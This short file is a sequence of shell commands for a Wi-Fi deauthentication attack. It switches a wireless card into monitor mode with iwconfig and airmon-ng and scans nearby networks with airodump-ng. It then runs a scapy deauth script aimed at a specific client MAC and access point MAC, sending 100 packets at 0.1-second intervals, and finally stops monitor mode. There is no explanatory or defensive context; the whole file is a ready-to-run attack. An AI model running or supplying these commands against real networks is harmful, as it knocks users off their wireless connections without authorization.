sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor

sudo airmon-ng start wlan0

airodump-ng wlan0mon

python scapy_deauth.py ea:de:ad:be:ef:ff 68:ff:7b:b7:83:be -i wlan0mon -v -c 100 --interval 0.1 

airmon-ng stop wlan0mon